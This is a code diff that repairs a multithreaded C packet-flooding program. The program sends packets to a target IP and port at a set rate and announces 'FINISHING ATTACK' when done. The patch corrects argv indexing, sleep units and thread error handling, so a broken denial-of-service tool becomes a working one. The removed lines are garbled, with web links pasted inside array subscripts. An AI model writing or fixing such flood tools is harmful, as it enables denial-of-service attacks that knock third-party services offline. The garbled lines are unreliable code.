@@ -42,7 +42,7 @@ void *send_packets(void *arg) {
         sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
         // Control the sending rate
-        usleep(1000/ data->send_rate); // Adjust sleep time based on send rate
+        usleep(1000000 / data->send_rate); // Adjust sleep time based on send rate (in microseconds)
     }
 
     close(sock);
@@ -51,14 +51,14 @@ void *send_packets(void *arg) {
 
 int main(int argc, char *argv[]) {
     if (argc != 5) {
-        fprintf(stderr, "Usage: %s <IP> <port> <Time> <threads>\n", argv);
+        fprintf(stderr, "Usage: %s <IP> <port> <num_packets> <send_rate>\n", argv[0]);
         exit(EXIT_FAILURE);
     }
 
-    char *ip = argv[[1]](https://stackoverflow.com/questions/78184/how-do-i-create-raw-tcp-ip-packets-in-c);
-    int port = atoi(argv[[2]](https://github.com/zheng-da/high-speed-data-transfer/blob/master/raw-sender.c));
-    int num_packets = atoi(argv[[3]](https://nmap.org/book/nping-man.html));
-    int send_rate = atoi(argv);
+    char *ip = argv[1];
+    int port = atoi(argv[2]);
+    int num_packets = atoi(argv[3]);
+    int send_rate = atoi(argv[4]);
 
     pthread_t threads[NUM_THREADS];
     thread_data_t thread_data[NUM_THREADS];
@@ -70,7 +70,10 @@ int main(int argc, char *argv[]) {
         thread_data[i].num_packets = num_packets / NUM_THREADS; // Distribute packets among threads
         thread_data[i].send_rate = send_rate;
 
-        pthread_create(&threads[i], NULL, send_packets, (void *)&thread_data[i]);
+        if (pthread_create(&threads[i], NULL, send_packets, (void *)&thread_data[i]) != 0) {
+            perror("Failed to create thread");
+            exit(EXIT_FAILURE);
+        }
     }
 
     // Wait for all threads to finish
@@ -78,6 +81,6 @@ int main(int argc, char *argv[]) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("FINISHING ATTACK .\n");
+    printf("FINISHING ATTACK.\n");
     return 0;
 }
